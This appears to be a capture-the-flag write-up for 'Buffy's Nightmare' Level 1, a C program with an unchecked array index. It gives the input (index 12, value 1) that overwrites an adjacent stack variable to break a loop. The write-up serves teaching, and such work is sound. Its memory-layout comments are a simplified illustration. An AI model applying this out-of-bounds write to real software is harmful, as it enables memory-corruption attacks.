# [Buffy's Nightmare] - Level 1 - Writeup

## Problem

We have a program that asks for an index and a value. The program writes the value to the array at the given index. The program then prints the value at the index and the value of `are_you_winning` which is initiazlized to 0. The program continues to ask for an index and a value until `are_you_winning` is 1.

We are stuck in an infinite loop because `are_you_winning` is always 0. We need to find a way to exit the loop in order to win.

## Solution

We need to somehow find a way to change the value of `are_you_winning` to 1 to exit the loop.

Note that we have an out-of-bounds write in the array `array`. We can write to any index in the array, including negative indexes and indexes greater than 9. We can use this to change the value of `are_you_winning` to 1!

To solve this challenge, we'll give the program the following input:

```bash
Index: 12 # Out-of-bounds write to overwrite are_you_winning
Value: 1
```

Shortly:

```bash
echo -e "12\n1" | ./l1.out
```

## Code with Comments and Memory Layout

```c
// Memory layout:
// are_you_winning: 00 00 00 00 (int = 4 bytes) address: 0x9030 (0x9000 + 4*12)
// index:           00 00 00 00 (int = 4 bytes)
// value:           00 00 00 00 (int = 4 bytes)
//                  00 00 00 00 // array[9]
//                  00 00 00 00 // array[8]
//                  00 00 00 00 // array[7]
//                  00 00 00 00 // array[6]
//                  00 00 00 00 // array[5]
//                  00 00 00 00 // array[4]
//                  00 00 00 00 // array[3]
//                  00 00 00 00 // array[2]
//                  00 00 00 00 // array[1]
// array:           00 00 00 00 (4 bytes)       address: 0x9000

int main() {
    int are_you_winning = 0;
    int index = 0;
    int value = 0;
    int array[10] = {0}; // Initialize array with zeros {0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
    while (are_you_winning != 1) { // While are_you_winning is not 1, run the loop below
        printf("Index: ");
        scanf("%d", &index); // Read integer from user into index
        printf("Value: ");
        scanf("%d", &value); // Read integer from user into value
        array[index] = value; // Set array[index] to value
        printf("Array[%d] = %d\n", index, array[index]); // Print value of array[index] and index
        printf("Are you winning son? %d\n", are_you_winning); // Print are_you_winning value
    }
    printf("You won!\n");
}
```
